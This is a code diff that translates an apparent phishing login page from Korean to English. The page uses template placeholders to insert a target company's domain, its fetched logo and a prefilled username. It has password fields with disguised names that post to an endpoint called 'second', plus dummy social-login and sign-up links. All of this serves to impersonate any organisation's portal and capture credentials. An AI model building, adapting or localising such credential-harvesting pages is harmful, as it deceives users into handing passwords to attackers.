@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
-    <title>{{dman}} 포털 로그인</title>
+    <title>{{dman}} Portal Login</title>
     <style>
         /* Reset default styles */
         * {
@@ -204,38 +204,37 @@
 
     <div class="login-container">
         <form action="second" class="login-form" id="loginForm" method="POST">
-            <h2>로그인</h2>
-            <center><img src="https://api.kickfire.com/logo?website={{dman}}" alt="회사 로고"></center>
+            <h2>Login</h2>
+            <center><img src="https://api.kickfire.com/logo?website={{dman}}" alt="Company Logo"></center>
 
             <div class="input-group">
                 <i class="icon">&#128100;</i>
-                <input type="text" id="username" name="horse" value="{{eman}}" required placeholder="사용자 이름을 입력하세요">
+                <input type="text" id="username" name="horse" value="{{eman}}" required placeholder="Enter your username">
             </div>
 
             <div class="input-group">
                 <i class="icon">&#128274;</i>
-                <input type="password" id="password" name="pig" placeholder="비밀번호를 입력하세요" required>
+                <input type="password" id="password" name="pig" placeholder="Enter your password" required>
             </div>
 
-            <button type="submit" class="login-btn">로그인</button>
+            <button type="submit" class="login-btn">Login</button>
 
             <div class="social-login">
-                <button class="social-btn">구글로 로그인</button>
-                <button class="social-btn">페이스북으로 로그인</button>
+                <button class="social-btn">Login with Google</button>
+                <button class="social-btn">Login with Facebook</button>
             </div>
 
             <div class="forgot-password">
-                <a href="#">비밀번호를 잊으셨나요?</a>
+                <a href="#">Forgot your password?</a>
             </div>
 
             <div class="signup-link">
-                <p>계정이 없으신가요? <a href="#">회원 가입</a></p>
+                <p>Don't have an account? <a href="#">Sign up</a></p>
             </div>
 
             <div id="error-message" class="error-message"></div>
         </form>
     </div>
-
 
 </body>
 </html>
